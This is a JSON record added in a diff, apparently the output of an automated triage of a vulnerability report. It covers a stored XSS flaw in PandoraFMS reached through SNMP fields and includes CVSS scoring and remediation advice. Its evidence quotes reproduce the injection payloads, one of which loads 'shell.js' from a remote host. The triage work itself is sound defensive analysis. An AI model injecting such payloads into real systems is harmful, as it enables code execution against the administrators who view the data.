@@ -1,0 +1,69 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "PandoraFMS 7.0 NG <= 746 contains a persistent cross-site scripting (XSS) vulnerability via SNMP fields which allows injection of JavaScript that loads a remote script and can be used to create plugins and execute remote commands, leading to remote code execution.",
+    "affected_product": "PandoraFMS 7.0 NG <= 746",
+    "cwe": "CWE-79",
+    "cwe_quote": "syscontact      <script>alert('AppleBois');</script>",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "By asking network administrator to scan SNMP device to trigger Cross Site Scripting(XSS)"
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "N",
+        "quote": "By asking network administrator to scan SNMP device to trigger Cross Site Scripting(XSS)"
+      },
+      "UI": {
+        "value": "R",
+        "quote": "By asking network administrator to scan SNMP device to trigger Cross Site Scripting(XSS)"
+      },
+      "S": {
+        "value": "U",
+        "quote": ""
+      },
+      "C": {
+        "value": "H",
+        "quote": "We can call a remote JavaScript file to execute arbitrary code to reach Remote Code Execution on PandoraFMS."
+      },
+      "I": {
+        "value": "L",
+        "quote": ""
+      },
+      "A": {
+        "value": "L",
+        "quote": ""
+      }
+    },
+    "recommended_next_step": "Verify the SNMP-sourced fields are properly sanitized/encoded on display and reproduce the report by providing crafted SNMP sysContact/sysLocation values; patch by adding output encoding and restricting inclusion of remote script tags, and add unit tests to prevent script injection.",
+    "confidence": "medium",
+    "evidence_quotes": [
+      {
+        "claim": "Description of attack vector (administrator scanning SNMP triggers XSS)",
+        "quote": "By asking network administrator to scan SNMP device to trigger Cross Site Scripting(XSS)"
+      },
+      {
+        "claim": "Example injected SNMP field showing script tag",
+        "quote": "syscontact      <script>alert('AppleBois');</script>"
+      },
+      {
+        "claim": "Example injected SNMP field that loads remote JavaScript",
+        "quote": "syslocation     <script type=\"text/javascript\" src='http://192.168.11.130/shell.js'></script>"
+      },
+      {
+        "claim": "Attacker claims remote JavaScript can achieve RCE",
+        "quote": "We can call a remote JavaScript file to execute arbitrary code to reach Remote Code Execution on PandoraFMS."
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 3163,
+    "output_tokens": 637,
+    "latency_s": null,
+    "batch": true
+  }
+}
